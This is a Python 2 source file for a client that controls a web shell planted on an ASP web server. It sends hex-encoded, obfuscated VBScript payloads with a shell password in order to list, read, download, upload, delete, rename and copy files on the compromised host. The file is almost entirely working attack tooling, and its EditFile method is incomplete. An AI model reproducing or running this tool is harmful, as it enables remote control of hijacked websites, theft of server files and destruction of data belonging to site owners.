#! /usr/bin/env python
#! -*-coding:utf-8 -*-
'''
    注意 路径必须用.replace('\\', '\\\\')转换线
    注意  z1每次传输到底使用什么加密
'''

import os
import sys
import urllib
import urllib2
import requests
import base64
import time
import re
from tools import *

class aspshell:
    sitepath = ""
    shellpass = ""
    url = ""
    
    def __init__(self, url, shellpass):
        code = '''
        response.write(server.mappath(Request.ServerVariables("SCRIPT_NAME")))
        '''.strip()
        self.shellpass = shellpass
        self.url = url
        data = {shellpass : code}
        html = Spider.post(url, data)
        self.sitepath =  html[:html.rfind("\\")+1].replace('\\', '\\\\')
        print self.sitepath
        
    
    #浏览文件目录
    def GetFilePath(self):
        filelist = re.compile(r"file:([\s\S]+?)\t\stime:([\s\S]+?)\t\ssize:([\d]+?)\t\sperm:([\d]+?)\n")
        code = '''
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""44696d2052523a52523d6264285265717565737428227a312229293a46756e6374696f6e204644286474293a46443d596561722864742926222d223a4966204c656e284d6f6e746828647429293d31205468656e3a4644203d204644262230223a456e642049663a46443d4644264d6f6e74682864742926222d223a4966204c656e2844617928647429293d31205468656e3a46443d4644262230223a456e642049663a46443d464426446179286474292622202226466f726d61744461746554696d652864742c342926223a223a4966204c656e285365636f6e6428647429293d31205468656e3a46443d4644262230223a456e642049663a46443d4644265365636f6e64286474293a456e642046756e6374696f6e3a53455420433d4372656174654f626a6563742822536372697074696e672e46696c6553797374656d4f626a65637422293a53657420464f3d432e476574466f6c646572282222265252262222293a496620457272205468656e3a526573706f6e73652e577269746528224552524f523a2f2f2022264572722e4465736372697074696f6e293a4572722e436c6561723a456c73653a466f722045616368204620696e20464f2e737562666f6c646572733a526573706f6e73652e577269746520462e4e616d6526636872283437292663687228392926464428462e446174654c6173744d6f646966696564292663687228392926636872283438292663687228392926432e476574466f6c64657228462e50617468292e6174747269627574657326636872283130293a4e6578743a466f722045616368204c20696e20464f2e66696c65733a526573706f6e73652e5772697465202266696c653a22264c2e4e616d652663687228392926222074696d653a22264644284c2e446174654c6173744d6f646966696564292663687228392926222073697a653a22264c2e73697a65266368722839292622207065726d3a2226432e47657446696c65284c2e50617468292e6174747269627574657326636872283130293a4e6578743a456e64204966"""")):Response.End"")")
        '''.strip()        
        payload = {self.shellpass:code, "z1":self.toHex(self.sitepath)}  # 这个z1需要十六机制加密
        data = Spider.post(self.url, payload)
        list = filelist.findall(data)
        self.ShowRule(list)
        
        
    #删除文件
    def DeleteFile(self, path):
        code = '''
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""44696D20503A503D5265717565737428227A3122293A5365742046533D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A49662046532E466F6C6465724578697374732850293D74727565205468656E3A46532E44656C657465466F6C6465722850293A456C73653A46532E44656C65746546696C652850293A456E642049663A5365742046533D4E6F7468696E673A496620457272205468656E3A533D224552524F523A2F2F2022264572722E4465736372697074696F6E3A456C73653A533D2231223A526573706F6E73652E57726974652853293A456E64204966"""")):Response.End"")")
        '''.strip()
        if path.find('\\') <0:
            path = self.sitepath + path
        payload = {self.shellpass:code, "z1":path}   # 这个z1需要url编码
        data = Spider.post(self.url, payload)
        if "1" in data:
            print "delete ok!"
       
        
    def UploadFile(self, localfile, remotepath=None ):
        code = '''
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""44696D206C2C73732C66662C543A66663D6264287265717565737428227A312229293A73733D5265717565737428227A3222293A6C3D4C656E287373293A53657420533D5365727665722E4372656174654F626A656374282241646F64622E53747265616D22293A5769746820533A2E547970653D313A2E4D6F64653D333A2E4F70656E3A4966205265717565737428227A3322293E30205468656E3A2E4C6F616446726F6D46696C652022222666662622223A2E506F736974696F6E3D2E53697A653A456E642049663A7365742072733D4372656174654F626A656374282241444F44422E5265636F726473657422293A72732E6669656C64732E617070656E6420226262222C3230352C6C2F323A72732E6F70656E3A72732E6164646E65773A72732822626222293D73732B636872622830293A72732E7570646174653A2E57726974652072732822626222292E6765746368756E6B286C2F32293A72732E636C6F73653A5365742072733D4E6F7468696E673A2E506F736974696F6E3D303A2E53617665546F46696C652022222666662622222C323A2E436C6F73653A456E6420576974683A53657420533D4E6F7468696E673A496620457272205468656E3A543D4572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A543D2231223A456E642049663A526573706F6E73652E5772697465285429"""")):Response.End"")")
        '''.strip()
        if remotepath == None:
            remotepath = self.sitepath
        with open(localfile, 'rb') as file:
            data = file.read()
        filestream = ""
        for line in range(len(data)):
            filestream += "%02x" % ord(data[line])
        suffix =  os.path.splitext(localfile)
        remotepath += os.path.split(suffix[0])[1] + suffix[1]  #自动填上文件名
        payload = {"w":code, "z1":self.toHex(remotepath), 'z2':filestream, 'z3':0}
        data = Spider.post(self.url,payload)
        if "1" in data:
            print "upload ok!"
      
        #重命名文件
    def RenameFile(self,oldname, newname):
        code = '''
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""53463D5265717565737428227A3122293A44463D5265717565737428227A3222293A5365742046733D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A49662046732E466F6C64657245786973747328534629205468656E3A46732E4D6F7665466F6C6465722053462C44463A456C73653A46732E4D6F766546696C652053462C44463A456E642049663A5365742046733D4E6F7468696E673A496620457272205468656E3A53493D224552524F523A2F2F2022264572722E4465736372697074696F6E3A456C73653A53493D2231223A456E642049663A526573706F6E73652E577269746528534929"""")):Response.End"")")
        '''.strip()
        if oldname.find('\\') <0:
            oldname = self.sitepath + oldname
        if newname.find('\\') <0:
            newname = self.sitepath + newname
        # suffix =  oldname[:oldname.rfind("\\")]
        # newname = "{0}\\{1}".format(suffix, newname)  #自动填上文件名
        payload = {"w":code, "z1":oldname, 'z2':newname}   # 这个z1需要url编码
        data = Spider.post(self.url,payload)
        if "1" in data:
            print "rename ok!"
            
     #移动文件
    def CopyFile(self, sourcepath, descpath):
        code = '''
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""53463D5265717565737428227A3122293A44463D5265717565737428227A3222293A5365742046733D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A49662046732E466F6C64657245786973747328534629205468656E3A46732E436F7079466F6C6465722053462C44463A456C73653A46732E436F707946696C652053462C44463A456E642049663A5365742046733D4E6F7468696E673A496620457272205468656E3A53493D224552524F523A2F2F2022264572722E4465736372697074696F6E3A656C73653A53493D2231223A456E642049663A526573706F6E73652E577269746528534929"""")):Response.End"")")
        '''.strip()
        if sourcepath.find('\\') <0:
            sourcepath = self.sitepath + sourcepath
        if descpath.find('\\') <0:
            descpath = self.sitepath + descpath
        # suffix =  sourcepath[sourcepath.rfind("\\")+1:]
        # descpath = "{0}\\{1}".format(descpath, suffix)  #自动填上文件名
        payload = {self.shellpass:code, "z1":sourcepath, 'z2':descpath}
        data = Spider.post(self.url, payload)
        if "1" in data:
            print "copy ok!"
    
        #读取文件
    def ReadFile(self, file):
        code = '''
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E5772697465284372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422292E4F70656E5465787466696C65286264285265717565737428227A312229292C312C46616C7365292E72656164616C6C293A496620457272205468656E3A526573706F6E73652E577269746528224552524F523A2F2F2022264572722E4465736372697074696F6E293A4572722E436C6561723A456E64204966"""")):Response.End"")")
        '''.strip()
        if file.find('\\') <0:
            file = self.sitepath + file
        payload = {self.shellpass:code, "z1":self.toHex(file)}   # 这个z1需要hex编码
        data = Spider.post(self.url, payload)
        print data
        
        
    
    #下载文件
    def DownloadFile(self,remotefile, localname=None):
        code = '''
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""44696D20692C632C723A53657420533D5365727665722E4372656174654F626A656374282241646F64622E53747265616D22293A4966204E6F7420457272205468656E3A5769746820533A2E4D6F64653D333A2E547970653D313A2E4F70656E3A2E4C6F616446726F6D46696C65285265717565737428227A312229293A693D303A633D2E53697A653A723D313032343A5768696C6520693C633A526573706F6E73652E42696E6172795772697465202E526561642872293A526573706F6E73652E466C7573683A693D692B723A57656E643A2E436C6F73653A53657420533D4E6F7468696E673A456E6420576974683A456C73653A526573706F6E73652E42696E617279577269746520224552524F523A2F2F2022264572722E4465736372697074696F6E3A456E64204966"""")):Response.End"")")
        '''.strip()
        if remotefile.find('\\') <0:
            remotefile = self.sitepath + remotefile
        if localname==None:
            localname = remotefile[remotefile.rfind("\\")+1:]
        payload = {self.shellpass:code, "z1":remotefile}   # 这个z1需要hex编码
        data = Spider.post(self.url,payload)
        if "ERROR" in data:
            print "download error"
        else:
            self.filesave(data, localname)
            print "download ok"
            
    def EditFile(self, file):
        tmpfile = md5(time.time())
        if file.find('\\') >= 0:
            name = html[html.rfind("\\")+1:]
        else:
            name = file
        self.DownloadFile(file, tmpfile)
        pass
        
    def ShowRule(self, list):
        string = "total: {0}\nperm\t\tsize\t\tdate\t\tfile\n".format(len(list))
        for line in list:
            string += "{0}".format(self.showrwx(line[3]))
            string += "\t\t{0}".format(line[2])
            string += "\t{0}".format(line[1])
            string += "\t{0}\n".format(line[0])
        print string
        
    def showrwx(self, num):
        permx = {0:'---', 1:'rwx', 2:'rwx', 4:'rwx',16:'r--' , 32:"rwx",33:"rwx", 1024:'r--' , 2048:'r--'}
        return permx[int(num)]

    def toHex(self, strx):
        strs = ""
        for line in strx:
            hexs = hex(ord(line)).replace('0x', '')
            if len(hexs) == 1:
                hexs = '0' + hexs
            strs += hexs
        return strs
        
    def filesave(self, data, name):
        with open(name, 'wb') as file:
            file.write(data)


